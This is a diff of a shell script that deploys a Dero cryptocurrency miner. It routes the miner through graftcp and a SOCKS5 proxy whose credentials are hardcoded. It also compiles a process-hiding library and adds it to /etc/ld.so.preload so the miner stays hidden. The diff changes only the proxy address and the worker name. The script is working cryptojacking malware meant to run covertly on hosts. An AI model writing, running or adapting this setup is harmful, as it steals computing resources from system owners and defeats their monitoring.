@@ -11,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 45.155.69.201:6406
+socks5 = 185.205.194.126:7646
 socks5_username = ingfoingfo
 socks5_password = maszZeehh
 END
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./dero-stratum-miner -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmjugulc4xqn0aspexa0n.SImbah 
+./graftcp/graftcp ./dero-stratum-miner -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmjugulc4xqn0aspexa0n.TukimenAnjayy 
